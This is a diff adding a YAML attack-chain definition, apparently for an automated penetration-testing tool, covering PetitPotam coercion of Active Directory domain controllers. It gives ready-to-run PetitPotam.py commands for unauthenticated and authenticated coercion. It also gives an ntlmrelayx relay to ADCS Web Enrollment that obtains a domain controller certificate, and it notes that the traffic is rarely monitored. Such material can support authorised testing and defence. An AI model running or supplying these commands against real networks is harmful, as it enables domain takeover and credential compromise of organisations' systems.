@@ -1,0 +1,39 @@
+chain_id: petitpotam_coercion
+title: "AD — PetitPotam (MS-EFSRPC) coercion, even unauthenticated on legacy DCs"
+severity: HIGH
+tags: [ad, coercion, petitpotam, ms-efsrpc, ntlm-relay]
+
+trigger:
+  any_of:
+    - { kind: "domain_user_credentials" }
+    - { kind: "ad_coercion_candidate" }
+    - { banner_pattern: "(?i)windows\\s*server|domain\\s*controller|active\\s*directory" }
+    - { service_pattern: "(?i)kerberos|ldap" }
+
+description: |
+  PetitPotam abuses MS-EFSRPC. Originally pre-auth on Windows Server
+  2008-2019 prior to the August 2021 patch; post-patch it still works
+  with any valid domain credential. Less detectable than PrinterBug
+  because EFSRPC traffic is rarely monitored.
+
+steps:
+  - id: 1
+    title: "Pre-auth attempt (works on legacy DCs)"
+    command: |
+      python3 PetitPotam.py -u '' -p '' $LISTENER $DC
+
+  - id: 2
+    title: "Authenticated variant (works on patched servers)"
+    command: |
+      python3 PetitPotam.py -u USUARIO -p 'PASSWORD' -d $DOMAIN $LISTENER $DC
+
+  - id: 3
+    title: "Combine with relay to ADCS Web Enrollment for DC certificate"
+    command: |
+      # Window 1 (Kali):
+      impacket-ntlmrelayx -t http://$ADCS/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+      # Window 2 (Kali):
+      python3 PetitPotam.py -u low_priv -p 'low_priv_pw' $LISTENER $DC
+
+references:
+  - https://github.com/topotam/PetitPotam
